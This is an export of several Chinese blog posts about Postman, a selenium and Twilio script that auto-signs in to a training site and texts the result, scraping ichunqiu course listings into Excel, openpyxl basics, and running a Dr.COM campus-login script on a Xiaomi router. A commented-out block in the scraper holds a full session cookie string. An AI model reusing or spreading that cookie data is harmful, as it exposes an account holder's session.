    <url>%2F2018%2F04%2F23%2FPostman%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[介绍： 模拟各种HTTP requests 从常用的 GET、POST 到 RESTful 的 PUT 、 DELETE …等等。 甚至还可以发送文件、送出额外的 header。 Collection 功能（测试集合） Collection 是 requests的集合，在做完一個测试的時候， 你可以把這次的 request 存到特定的 Collection 里面，如此一來，下次要做同样的测试时，就不需要重新输入。而且一个collection可以包含多条request，如果我们把一个request当成一个test case，那collection就可以看成是一个test suite。通过collection的归类，我们可以良好的分类测试软件所提供的API.而且 Collection 还可以 Import 或是 Share 出來，让团队里面的所有人共享你建立起來的 Collection。 人性化的Response整理 一般在用其他工具來测试的時候，response的内容通常都是纯文字的 raw， 但如果是 JSON ，就是塞成一整行的 JSON。这会造成阅读的障碍 ，而 Postman 可以针对response内容的格式自动美化。 JSON、 XML 或是 HTML 都會整理成我们可以阅读的格式 内置测试脚本语言 Postman支持编写测试脚本，可以快速的检查request的结果，并返回测试结果 设定变量与环境 Postman 可以自由 设定变量与Environment，一般我们在编辑request，校验response的时候，总会需要重复输入某些字符，比如url，postman允许我们设定变量来保存这些值。并且把变量保存在不同的环境中。比如，我們可能会有多种环境， development 、 staging 或 local， 而这几种环境中的 request URL 也各不相同，但我们可以在不同的环境中设定同样的变量，只是变量的值不一样，这样我们就不用修改我们的测试脚本，而测试不同的环境。 下载地址：因为2018年初Chrome禁止了Postman，但我刚才使用的时候是可以再Chrome浏览器使用的。然而还是有个提示建议用本地客户端。 所以放出官网下载链接 https://www.getpostman.com/postman 可以使用google账号直接登录 使用： 官方文档https://www.getpostman.com/docs/v6/]]></content>
      <categories>
        <category>CTF工具</category>
      </categories>
      <tags>
        <tag>web,tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3实现hetianlab自动签到并且发短信到手机]]></title>
    <url>%2F2018%2F04%2F17%2Fhetianlab%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E5%B9%B6%E4%B8%94%E5%8F%91%E7%9F%AD%E4%BF%A1%E5%88%B0%E6%89%8B%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[首发合天，禁止转载0x00 前言​ 这几天学了学python爬虫，就想用python实现一下自动签到领取积分，毕竟我比较懒，能不动手就让代码去做吧，☺。 0x01 安装环境python 需要用到的库12pip install selenium #模拟浏览器行为的库pip install twilio #发送短信 安装ChromeDriverChromeDriver是Chrome浏览器的自动化测试工具 1、先查看Chrome浏览器的版本 点击 Chrome 的菜单，帮助-&gt;关于 Chrome，即可查看 Chrome 的版本号 这里我的版本号是65.0 2、下载ChromeDriver 官方下载链接： https://sites.google.com/a/chromium.org/chromedriver/downloads 这里我就下载 ChromeDriver 2.37 3、配置环境变量 Windows下，直接把ChromeDriver .exe 放在Python的 Scripts目录下 Linux和Mac也是一样把文件移动到属于环境变量的目录里或者将可执行文件配置到环境变量。 例如下面移动文件到 /usr/bin 目录，首先进入其所在路径，然后将其移动到 /usr/bin： 1sudo mv chromedriver /usr/bin 4、测试一下哈 在命令行输入 chromedriver ，如果有类似输出就说明chromedriver 的环境变量配置好了 然后再写代码测试一下 12from selenium import webdriverbrowser = webdriver.Chrome() 运行，会弹出Chrome浏览器，就可以开始写登录代码了。 0x02 登录hetianlabselenium是什么官方的话：selenium一个Web应用程序测试的工具，而且Selenium测试直接运行在浏览器中，就像真正的用户在操作一样 简单的说，就是我们可以用selenium来控制浏览器然后完成一系列操作，比如打开某个网页，点击超链接、按钮，在文本框输入字符，获取网页的内容，模拟鼠标操作（右键，双击） Selenium 支持非常多的浏览器，如 Chrome、Firefox、Edge等，最新版本的Selenium已经不支持无界面浏览器PhantomJS，但是Chrome和Firefox已经支持无界面。 我们可以用下面的方式初始化一个浏览器对象 1234567from selenium import webdriverbrowser = webdriver.Chrome()browser = webdriver.Firefox()browser = webdriver.Edge()browser = webdriver.PhantomJS()browser = webdriver.Safari() 设置Chrome浏览器无界面： 1234567from selenium import webdriverfrom selenium.webdriver.chrome.options import Options #导入Optionschrome_options = Options()chrome_options.add_argument('--headless') #无界面模式chrome_options.add_argument('--disable-gpu') #Windows平台需要加上browser = webdriver.Chrome(chrome_options=chrome_options) #把无界面设置导入 想要了解更多，可以查看官方文档：https://developers.google.cn/web/updates/2017/04/headless-chrome 打开一个网页Selenium提供了get()方法来访问网页 123456from selenium import webdriverbrowser = webdriver.Chrome()browser.get('https://www.baidu.com') #打开百度print(browser.page_source)browser.close() selenium怎么获取网页信息获取节点selenium获取节点（节点可以理解是网页的按钮，输入框等，学过HTML的同学知道其实它就是一个标签或者标签里面的内容、属性）的方法很多，下面是获取单个节点的方法，返回的是WebElement 类型 12345678find_element_by_idfind_element_by_namefind_element_by_xpathfind_element_by_link_textfind_element_by_partial_link_textfind_element_by_tag_namefind_element_by_class_namefind_element_by_css_selector 想获取多个节点的话，就是element后面加上s 例如：find_elements_by_id 查找多个节点函数返回的结果是一个列表，列表的每个节点是WebElement 类型 节点交互输入文字用 send_keys() 方法，清空文字用 clear() 方法，另外按钮点击用 click() 方法。例如： 12phonenumber = browser.find_element_by_id('userEmail') #通过id捕获到用户名输入框phonenumber.send_keys(Username) #在用户名文本框输入用户名 获取节点信息WebElement 类型有相关的方法和属性来直接提取节点信息，如属性、文本等等 123456input = browser.find_element_by_by_id('userEmail')print(input.get_attribute('class') #获取class的名字print(input.id) #获取idprint(input.location) #location 可以获取该节点在页面中的相对位置 print(input.tag_name) #tag_name 可以获取标签名称print(input.size) #size 可以获取节点的大小 知识点介绍好了，开始实战，打开我们要签到的首页，F12 -&gt;点一下左边的小箭头-&gt;再点输入手机的文本框-&gt;就会显示出文本框的信息来。查看发现它的id是userEmail，就可以通过id来获取这个节点。 密码框和登录按钮也是如此，类似操作拿到密码框的id是 passwordIn，登录按钮的id是registButIn。 于是我们初步的代码已经出来了。 version 1.0这是第一个版本， 12345678910111213141516from selenium import webdriverimport timeUsername = 'xxxxxxxxx' #登录的手机号码Password = 'xxxxxxxxxx' #密码loginUrl = 'http://www.xxxxxx.com/loginLab.do' #xxxxxx登录网址browser = webdriver.Chrome()browser.maximize_window() #浏览器最大化browser.get(loginUrl) #Chrome浏览器打开登录页面phonenumber = browser.find_element_by_id('userEmail') #通过id捕获到用户名输入框phonenumber.send_keys(Username) #在用户名文本框输入用户名password = browser.find_element_by_id('passwordIn') #通过id捕获到密码输入框password.send_keys(Password) #在密码框输入密码siginbutton = browser.find_element_by_id('registButIn') #捕获到登录按钮 siginbutton.click() #点击登录按钮time.sleep(3) #暂停3sbrowser.close() #关闭浏览器 运行，试了几次竟然都成功登录了 :-( 我之前测试的时候，老是没有登录成功，原因是 登录按钮没有获取到，就算暂停了程序(time.sleep())等一等还是有这个问题。所以我就写了个函数来检查登录按钮是否获取成功 1234567891011121314151617def isFindElement(element): # print('check:') # print(element) if element: #如果捕获到元素，就返回true，否则返回false return True else: return False def SignIn() #略略略 #----- siginbutton = browser.find_element_by_id('registButIn') while(not isFindElement(siginbutton)): #循环判断登录按钮是否获取成功，成功就退出 time.sleep(0.5) print('signin-false') siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() 之前测试的时候，check起码打印两次 :-( ， 但是想到这个方法的估计也就像我一样是个不怎么了解selenium的新手 后来了解到 selenium的等待，赶紧优化一下 version 2.0介绍两个新概念 selenium 的隐性等待和显性等待 隐性等待隐形等待是设置了一个最长等待时间，如果在规定时间内网页加载完成，则执行下一步，否则一直等到时间截止，然后执行下一步。 1implicitly_wait(10) #等待10s 温馨提示：隐性等待在整个driver的周期都起作用，所以只要设置一次即可显性等待WebDriverWait，配合该类的until()和until_not()方法，就可以根据判断条件而进行灵活地等待了。 它主要的意思就是：程序每隔xx秒看一眼，如果条件成立了，则执行下一步，否则继续等待，直到超过设置的最长时间，然后抛出TimeoutException。 代码具体什么意思可以去看一下手册，这里我们只要会调用就好了。 123456789101112131415from selenium.webdriver.support.wait import WebDriverWait #导入了新的库from selenium.webdriver.support import expected_conditions as EC #导入了新的库from selenium.webdriver.common.by import By #导入了新的库 def SignIn() #省略十万行代码 locator = (By.ID, 'registButIn') #通过id发现的登录按钮 try: #等待30s，默认0.5s检查一次是否捕获到登录按钮 WebDriverWait(browser,30).until(EC.presence_of_element_located(locator)) siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() print('登录按钮点击成功') except: print("registButIn can't find") 温馨提示：最长等待时间取决于隐性等待和显性等待的最大值。上面例子为30s，如果隐性等待时间大于显性等待时间，那么最长等待时间就是隐性等待时间 顺便包装为函数方便调用，添加上获取合氏币的代码，前面为了方便测试就没有设置为无界面模式，现在可以设置为无界面模式了version 2.0 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/17 12:55# @Author : Lhaihai# @File : # @Software: PyCharm""" Description : 自动登录，签到一下，并且拿到自己当前积分有多少，最后发送短信给手机"""from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.support.wait import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By import timechrome_options = Options()chrome_options.add_argument('--headless')chrome_options.add_argument('--disable-gpu')def SignIn(Username,Password): loginUrl='http://www.xxxxxxx.com/loginLab.do' browser = webdriver.Chrome(chrome_options=chrome_options) #设置为无界面模式 browser.maximize_window() browser.implicitly_wait(10) #隐性等待10s browser.get(loginUrl) phonenumber = browser.find_element_by_id('userEmail') phonenumber.send_keys(Username) password = browser.find_element_by_id('passwordIn') password.send_keys(Password) locator = (By.ID, 'registButIn') try: WebDriverWait(browser,30).until(EC.presence_of_element_located(locator)) #显性等待30s siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() print('登录按钮点击成功') except: print("registButIn can't find") time.sleep(3) #signImg捕获用户头像，没错就是头像，其实把鼠标放到头像上就会显示我的主页，selenium也有模拟鼠标操作的，那就是ActionChains，这里简单起见就直接使用.click()了 signImg = browser.find_element_by_class_name('siLg-img') signImg.click() #点击 myindex = browser.find_element_by_link_text('我的主页') myindex.click() #点击我的主页 heshibi = browser.find_elements_by_class_name('allNum') #获得登录次数和积分数量 Msg = '签到成功\n登录次数:' + heshibi[0].text + ',积分：' + heshibi[1].text print(Msg) browser.close() if __name__ == '__main__': SignIn('username','password') #填写你的用户名和密码 0x03 发送短信​ 这时候我们已经可以成功登录并且拿到自己账号积分的数量。接下来我们进行最后一步，发送短信到自己手机上。 1、注册Twilio账号访问http://twilio.com/（需要自备梯子）填写注册表单。注册了新账户后，你需要验证一个手机号码，短信将发给该号码（这项验证是必要的，防止有人利用该服务向任意的手机号码发送垃圾短信）。收到验证号码短信后，在Twilio网站上输入它，证明你拥有要验证的手机。 现在，就可以用twilio模块向这个电话号码发送短信了。 2、获取一个Twilio电话号码：我在Dashboard找了好久没发现Phone的选项，后来翻了翻官方教程https://support.twilio.com/hc/en-us/articles/223136107-How-does-Twilio-s-Free-Trial-work-/，然后点里面的链接打开 :-( 。 其实你可以用右上角的UPGRADE搜索框搜索，或者直接打开这个网址 https://www.twilio.com/console/phone-numbers/getting-started 挑一个地区和号码，确定。恭喜你，获得一个免费的电话号码了。 3、要验证接收短信的手机号码，要不然就会出现下面的报错1twilio.base.exceptions.TwilioRestException: HTTP 400 error: Unable to create record: The number +8613xxxxxx30 is unverified. Trial accounts cannot send messages to unverified numbers; verify +8613xxxxxx30 at twilio.com/user/account/phone-numbers/verified, or purchase a Twilio number to send messages to unverified numbers. 在Verified 验证手机号码 可以发送短信验证码或者接受电话获得验证码 4、正式发送短信从官方文档 https://www.twilio.com/docs/libraries/python 拿到下面代码 123456789101112131415from twilio.rest import Client# Your Account SID from twilio.com/consoleaccount_sid = "AC9810ae2342f0014cd05e338bce9be8cb"# Your Auth Token from twilio.com/consoleauth_token = "your_auth_token"client = Client(account_sid, auth_token)message = client.messages.create( to="+15558675309", #接收短信的手机 from_="+15017250604", #自己twilio的号码 body="Hello from Python!") #短信的内容print(message.sid) 只需要把 auth_tocken 和from_换成自己的，再修改一下to和body auth_tocken : 打开Dashboard，加密的就是你的auth_tocken message 的from_ 填上你的twilio手机号码，虽然你选择号码的时候看起来是这样子：+1(855) 912-6770 (这个号码是我重新去twilio买电话号码那随机拿的一个，并不是我的:） )但是最后你会获得一个号码：类似+15017250604 ， 运行一下，就可以收到短信了，短信的号码是会换了，玩多了你就发现自己手机一大片都是twilio的短信 最后封装一下函数，类似下方， 12345678910111213141516from twilio.rest import Clientdef sendMessage(toPhoneNumber,Msg): # Your Account SID from twilio.com/console account_sid = "AC9810ae2342f0014cd05e338bce9be8cb" # Your Auth Token from twilio.com/console auth_token = "your_auth_token" client = Client(account_sid, auth_token) message = client.messages.create( to='+86'+toPhoneNumber, #接收短信的手机 from_="+15017250604", #自己twilio的号码 body=Msg) #短信的内容 print(message.sid) 我保存为twilioToMyPhone.py，放到python.exe 当前目录下 以后想发送短信就直接调用： 12import twilioToMyPhonetwilioToMyPhone.sendMessage('phonenumber',Msg) 5、在version 2.0 加上发送短信的代码在开头导入库 1import twilioToMyPhone 在browser.close() 之前，Msg = &#39;&#39;签到成功......&#39;之后加上发送短信的一句代码 123Msg = '签到成功\n登录次数:' + heshibi[0].text + ',积分：' + heshibi[1].texttwilioToMyPhone.sendMessage('phonenumber',Msg)browser.close() 差不多大功告成了，就算可以一键登录，不用手动打开浏览器，我还是想跟懒一点 :） 最后一步，设置每天自动启动py tip1:to=”+15558675309” to的值是接收短信的手机号码，注意的是，中国大陆的电话号码要在前面加上+86 tip2：python文件的命名不能是twilio.py 如果你像我一样给它这样命名，在import twilio库的时候会失败， 哈哈，宛如一个智障（自我嘲讽一波） 找找stackoverflow.com发现下面这个： https://stackoverflow.com/questions/41013556/importerror-cannot-import-name-twiliorestclient tip3：github项目 https://github.com/twilio/twilio-python/ 0x04 设置每天自动启动python.bat 运行python问题来了，想要运行python代码，总不能启动pycharm然后点击运行吧 ，所以使用DOS命令来运行python代码 而.bat 是 windows的批处理文件，可以双击.bat文件来运行我们的python代码 具体什么意思么，.py文件不能像exe一样双击运行，但是.bat文件可以，这是为了方便我们下一步的任务启动器 类似下图， 这里有个坑，当你原原本本按照上图打好了每一个字符，双击.bat ，却发现没有成功运行（收到短信） 然后复制python F:\CodeDevelopment\PythonDevelopment\hetianLabSignin.py 到DOS，发现有个方框在 F:\前面，去掉方框，再从DOS复制这条代码到.bat文件，就可以运行了。或者直接先在DOS敲好这句代码，然后复制到.bat。 当然，顺便运行看看能不能正常启动，类似下图就是成功了，但DOS会跳出一些INFO，目前还不知道为什么 任务计划程序当当当，最最后一步，设置自动启动 不同操作系统都有自己的任务计划程序 Windows ：任务计划程序， Linux： Cron Mac ： Launchd 以Windows 10 为例子： 1、打开任务计划程序，直接搜索就好了，win+s弹出搜索框(开着小娜的话电脑CPU利用率一直挺高，关了就好很多了)，然后输入任务计划程序 2、点击右边的创建任务 3、名字自己随便取吧，触发器-&gt;新建-&gt; 设置每天某个时候启动， 但是如果我那个时候电脑没有开启呢？可以在设置勾上 ‘如果过了计划开始时间，立即启动任务’ 4、最重要的操作来了，新建操作-&gt;浏览选上测试好的bat 5、乖巧等待它自动运行 0x05 后记或许有大佬想问了，为啥不用request，而这么麻烦的用selenium。 我是学习了selenium后，想要练练手，仅此而用。 简单尝试了下request 123456789import requestsdatas=&#123; 'username':'xxxxxxxxxxx', 'password':'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'&#125;r= requests.get('http://www.xxxxx.com/loginLab.do',data=datas)print(r.text) 直接在登录页面post没成功，抓包发现 先是Post一个去/getRsaOfKey.action 返回一些字符串 接着 才是真的 POST /Login.action 发现它post过去的密码是经过加密了的，而且还POST了两个认证参数 1&amp;validateCode=&amp;rtnJson=true 所以我们构造POST的data为 123456datas=&#123; &apos;username&apos;:&apos;xxxxxxxxxxxx&apos;, &apos;password&apos;:&apos;xxxxxxxxxxxxxxxxxxxxxxxxx&apos;, &apos;validateCode&apos;:&apos;true&apos;, &apos;rtnJson&apos;:&apos;true&apos;,&#125; 因为是先POST去 /getRsaOfKey.action拿到加密后的password，然后POST /Login.action 所以我直接request请求/Login.action 然后再request一下自己的主页看看登录次数 检查一下当前的登录次数：264 运行代码： 再运行一次： 登录成功了，以后登录就只需要运行下面短短20行左右代码，感谢合天小姐姐提醒我填了这个坑 123456789101112131415161718192021222324252627282930313233#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/24 13:02# @Author : Lhaihai# @File : Request模拟登陆xxxx.py# @Software: PyCharm""" Description : 使用request来登陆"""import requestsfrom bs4 import BeautifulSoupdatas=&#123; 'username':'xxxxxxxxxxxxx', 'password':'xxxxxxxxxxxxxxxxxxxxxxxxx', 'validateCode':'true', 'rtnJson':'true',&#125;url = 'http://www.xxxxxxx.com/Login.action'myindexUrl = 'http://www.xxxxxxxx.com/profile.do?u=xxxxxxxxxxxx' #我的主页urlsession = requests.session()#模拟登陆r = session.post(url,data=datas)#输出响应报文状态码print(r.status_code)#请求访问主页r2 = session.get(myindexUrl)bs = BeautifulSoup(r2.text,'lxml')for Msg in bs.find_all(class_='logoRight'): for ms in Msg.find_all(name='p'): print(ms.string) 写得挺长的，或许有些错误。虚心请教各位大表哥，如果发现错误，请指点一下小弟。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取ichunqiu的课程列表]]></title>
    <url>%2F2018%2F04%2F16%2F%E7%88%AC%E5%8F%96ichunqiu%E7%9A%84%E8%AF%BE%E7%A8%8B%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[0x00 模拟浏览器登录0x01 爬取课程数据0x02 把课程数据保存在Excel表格爬取了ichunqiu的全部课程，把课程名字，费用，课程时间，学习人数保存到Excel表格里 最后统计了一下，如果购买ichunqiu的全部360门课程，需要 13835 元，好贵，可恶。还好强网杯送了VIP 每门课的学习人数加起来有 ： 20338110 对你没看错，两千多万，:-( 看来很多大表哥都在认真学习，我需要继续加油 现在有点晚了，有空再详细写一下 把代码奉上:） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/16 20:04# @Author : Lhaihai# @File : 爬取ichunqiu的课程.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 看了ADO大哥的Python视频，特来练练手"""import timefrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsimport openpyxldef main(): url = 'https://user.ichunqiu.com/login?r=https%3A%2F%2Fwww.ichunqiu.com%2F' chrome_options = Options() chrome_options.add_argument('--headless') chrome_options.add_argument('--disable-gpu') browser = webdriver.Edge() browser.maximize_window() browser.implicitly_wait(10) browser.get(url) phonenumber = browser.find_element_by_id('username') phonenumber.send_keys('132xxxxxxxx') #ichunqiu用户名 password = browser.find_element_by_id('password') password.send_keys('xxxxxxxx') #密码 siginbutton = browser.find_elements_by_tag_name('button') siginbutton[1].click() zhishitixi = browser.find_element_by_link_text('知识体系') zhishitixi.click() pagesizetext = browser.find_element_by_class_name('paginmsg') pagesize = int(pagesizetext.text[1:3]) print(pagesize) time.sleep(5) fileName = 'ichunqiuCourse.xlsx' wb = openpyxl.load_workbook(fileName) sheet = wb['Sheet1'] coursenum = 1 for i in range(pagesize): print('第%s页：'%(i+1)) try: courses = browser.find_elements_by_class_name('coursedesc') except: courses = browser.find_elements_by_class_name('coursedesc') for course in courses: coursenum += 1 temp = str(course.text).split('\n') q = 0 for k in ['A','B','C','D']: sheet[k+str(coursenum)]=temp[q] q +=1 print(temp[0]+' '+temp[1]+' '+temp[2]+' '+temp[3]) time.sleep(30) forward = browser.find_element_by_link_text('下一页') forward.click() wb.save(fileName) time.sleep(10) browser.close() # headers = &#123; # 'Host': 'www.ichunqiu.com', # 'Upgrade-Insecure - Requests': '1', # 'User-Agent': 'Mozilla / 5.0(Windows NT 10.0; WOW64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 65.0 .3325 .162 Safari / 537.36', # 'Cookie':'jsluid = db12a88242060be7332ceb595406d146; UM_distinctid = 160 f2bab2de3e - 075 c93693782be - 5 a442916 - 144000 - 160 f2bab2df60c; pgv_pvi = 3608032256; chkphone = acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; bdshare_firstime = 1523760890619; CNZZDATA1262179648 = 1767882761 - 1515897679 - https % 253 A % 252 F % 252 Fwww.baidu.com % 252 F % 7 C1523878517; pgv_si = s8916923392; Hm_lvt_2d0601bd28de7d49818249cf35d95943 = 1523684986, 1523758601, 1523780794, 1523879628; robot = 1; Hm_lvt_9104989ce242a8e03049eaceca950328 = 1523512155, 1523544753, 1523758659, 1523879645; Hm_lpvt_9104989ce242a8e03049eaceca950328 = 1523879645; Hm_lvt_1a32f7c660491887db0960e9c314b022 = 1523512155, 1523544754, 1523758659, 1523879645; Hm_lpvt_1a32f7c660491887db0960e9c314b022 = 1523879645; browse = CFlZTVQKAE9cU1FMW0oaT1haUldcQVhNRFNbWFxBSUdaWVxAVEBbV1IKUkBYQFxGUhBSRFdLS0dZUlBYXkJER1lDWkZURVxPWldKTgdLXE1dUV9OHUtYTFNBWkVfSURFXU5YTU5BUE9dW1JEXVNSHFNWWUVYSFIGU1JRT0xDWURRTlhGQ0NQVVlTUkVdS1tDS1gBT1tGUUJQWBtPX0hTV1tTWU1DQV1YWFRIRFdLXEFTV1xXVRhTQFhXWEBVAlNEUFlKR15AUVhZV0VFVlFbRFNWUU9fQ0tOAFldRlpCXk4aWVlMVFNbRVhbRUVaXFhCSVFYT15EU0FfQVMcVERdRVBQUwZUQFBPS1FYRFZcWUFEUl5VX0FTQF1ZWkVMSgBPXFVRRF9KGk9YWlJXXEFYTURTXFheSElEWllbRVRFXVdSClJAVkJaRlIQUkRXS0tHWVJQWF5FRERYQ1pFVEBQT1hWSk4HS1xNXlpRTh1LWExTQVpFX0lERV1OWUVOQFxPWFZSQFdTUhxTVFBOHUtYTFNBWkVfSURFXU5ZRU5AXE9YVVJBWFNSHFNXX0BVAlNEUFlKR15AUVhZV0VEXlFbRFNWXk9eQUtOAFldQVlCXE4aWVlMVFNbRVhbRUVaXFhFSVFZT1tHU0VdQVMcVERRQVhWUwZUQFBPS1FYRFZcWUFEUllVX0NTRl1ZWkVMSgBPX1JbTV1KGk9YWlJXXEFYTURTXFhfQ0lEXVlZRFRFXVdSClJDX0ReQlIQUkRXS0tHWVJQWF5FRERaQ1lGVEVQT1tWSk4HS19EX1dRTh1LWExTQVpFX0lERV1OWUNOQFlPWlZSRFhTUgg; ci_session = 61 ef25a31707ca2e4aca5c072f778ef4068bcd64; Hm_lpvt_2d0601bd28de7d49818249cf35d95943 = 1523880868' # &#125; # # r = requests.get(url) # r.status_code # r.encoding = 'utf-8' # print(r.text)if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA['python操作Excel']]></title>
    <url>%2F2018%2F04%2F16%2Fpython%E6%93%8D%E4%BD%9CExcel%2F</url>
    <content type="text"><![CDATA[0x00 安装openpyxlpip install openpyxl 我直接使用pycharm在当前项目安装了 0x01 读写Excel打开Excel文档1wb = openpyxl.load_workbook('ichunqiuCourse.xlsx') 取得工作表123wb.sheetnames #获得Excel每个表的名字sheet = wb['Sheet1'] #获得工作表，对工作表进行操作print(sheet['A1'].value) #获得Sheet1表格A1单元格的值 测试下面代码 12345678import openpyxlwb = openpyxl.load_workbook(&apos;ichunqiuCourse.xlsx&apos;)print(&apos;Excle的工作表有：&apos;+str(wb.sheetnames))sheet = wb[&apos;Sheet1&apos;]for i in [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;]: print(sheet[str(i)+&apos;1&apos;].value+&apos;:&apos;+sheet[str(i)+&apos;2&apos;].value) 向Excel写入数据12345sheet['A3']= '社工情报侦察神器——Maltego'sheet['B3']= '免费'sheet['C3']= '7课时174分钟'sheet['D3']= '25651人学习'wb.save('ichunqiuCourse.xlsx') 成功写入数据 0x02完整代码 123456789101112131415161718192021222324#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/16 22:08# @Author : Lhaihai# @File : controlExcel.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 使用python读写Excel"""import openpyxlwb = openpyxl.load_workbook('ichunqiuCourse.xlsx')print('Excle的工作表有：'+str(wb.sheetnames))sheet = wb['Sheet1']for i in ['A','B','C','D']: print(sheet[str(i)+'1'].value+':'+sheet[str(i)+'2'].value)sheet['A3']= '社工情报侦察神器——Maltego'sheet['B3']= '免费'sheet['C3']= '7课时174分钟'sheet['D3']= '25651人学习'wb.save('ichunqiuCourse.xlsx') 注意：我看的《Python编程快速上手——让繁琐工作自动化》这本书，也许是这本书有点旧了，里面刚开始用的是 get_sheet_names 和get_sheet_by_name ，但是PyCharm会warning，提示建议使用 wb.sheetnames和wb[sheetname] 123DeprecationWarning: Call to deprecated function get_sheet_names (Use wb.sheetnames)DeprecationWarning: Call to deprecated function get_sheet_by_name (Use wb[sheetname]). 我搜到有人使用xlrd、xlwt包来操作Excel，但http://www.python-excel.org/推荐使用`openpyxl` 我也推荐用openpyxl ，因为它比那两个包方便很多。 至于一些字体大小也颜色也是可以设置的，就不写了，如果要用到就翻书吧。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA['小米路由器开机自动登录Dr.COM']]></title>
    <url>%2F2018%2F04%2F16%2F%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E5%BC%80%E6%9C%BA%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95Dr-COM%2F</url>
    <content type="text"><![CDATA[0x00 小米路由开启SSH访问1.检查是否为开发版 2.如果不是开发版，到下面网址下在rom升级http://www1.miwifi.com/miwifi_download.html next 3.然后网页打开http://miwifi.com/cgi-bin/luci/web 进入管理页面手动升级 4.给小米路由安装SSH管理工具，具体看下面这篇百度经验，还是挺容易的https://jingyan.baidu.com/article/a24b33cd1080f719fe002b8e.html 注意：​ 在用SSH连接小米路由器时，不同路由器的IP地址可能不同，查看小米路由器的，下图圈起来来的IP地址就是SSH登录时的服务器IP，用户名是：root，密码：下载小米路由器SSH工具的页面有 0x01 测试Dr.com具体步骤查看下方网址： https://github.com/drcoms/drcom-generic/wiki/d%E7%89%88%E7%AE%80%E7%95%A5%E4%BD%BF%E7%94%A8%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E 1.使用wireshark在官方客户端登录前开始截包，做一次完整的截包动作然后登出，保存为 wireshark截包文件, 比如 dr.pcapng (扩展名为pcapng)。 2.下载 d版配置生成器, 将其与第一步的截包文件放到同一个目录下，并且将第17行的 filename = &#39;3.pcapng&#39; 中的 dr.pcapng 改为第一步保存的文件名。 3.进入命令提示符(或shell)进入 drcom_d_config.py 所在目录，输入 python drcom_d_config.py &gt; config.txt ，打开 config.txt 根据提示，新建drcom.conf文件，复制类在似下方段落保存在drcom.conf文件中 123456789101112131415server = &apos;119.39.119.2&apos; //服务器ip地址username=&apos;02xxxxxxxxx@zndx&apos; //xxx是你的学号password=&apos;&apos;CONTROLCHECKSTATUS = &apos;\x20&apos;ADAPTERNUM = &apos;\x08&apos;host_ip = &apos;10.0.7.24&apos; //小米路由器的ip地址IPDOG = &apos;\x01&apos;host_name = &apos;GILIGILIEYE&apos;PRIMARY_DNS = &apos;192.168.31.1&apos;dhcp_server = &apos;0.0.0.0&apos;AUTH_VERSION = &apos;\x2d\x00&apos;mac = 0x000000000000host_os = &apos;NOTE7&apos;KEEP_ALIVE_VERSION = &apos;\xd8\x02&apos;ror_version = True 4.在自己电脑测试 保存https://github.com/drcoms/drcom-generic项目的latest-wired.py 到自己电脑（发现原来有python3版本的呀，苦逼的我为了用python2特地修改了下系统环境变量） 注意latest-wired.py使用python2执行，latest-wired-python3.py应该可以用python3执行，看官可以自己试一下，我没有测试。 傻傻的我直接打在windows打linux命令了 改一改绑定的端口就可以了，在73行 看到类似提示，那就是可以用了，这时候并没有成功连接Dr.com的服务器，因为我这是候还没有在drcom.conf配置文件的password打上我联通账号的密码。将 latest-wired.py 改名为 drcom.py 接下来就到小米路由器上测试了。 0x02设置小米路由器开机启动Dr.com下方网址的大哥写得很详细了，我就补充一下一些需要注意的地方： http://bbs.xiaomi.cn/t-12871940 1.配置开机自动运行 Dr. COM 登录脚本/etc/inittab可以使用WinSCP直接操作，不熟悉vim命令的话 使用vim的过程十分痛苦（有点反人类）,复制::respawn:/data/python/usr/bin/python /data/python/usr/bin/drcom.py 到inittab最后一行，Ctrl+S保存，退出 2.放配置文件 0x03 效果reboot路由器后，ps查看。等个几秒钟，就连上网了 0x04 后记昨晚弄好没有问题，早上起来用手机连上WiFi又弹出联通页面了。 putty连接小米路由器（小强root@XiaoQiang:~#)，刚开始我以为是联通服务器有问题掉线了，我偶尔遇到过Dr.com客户端断开连接，然后reboot重启下路由器。 再ps查看一下，咦，怎么没有我可爱的python进程（登录哆点的脚本） 最后检查了etc/inittab，没错就是添加 ::respawn:/data/python/usr/bin/python /data/python/usr/bin/drcom.py 这条语句的文件，发现这条语句没了，emmmm 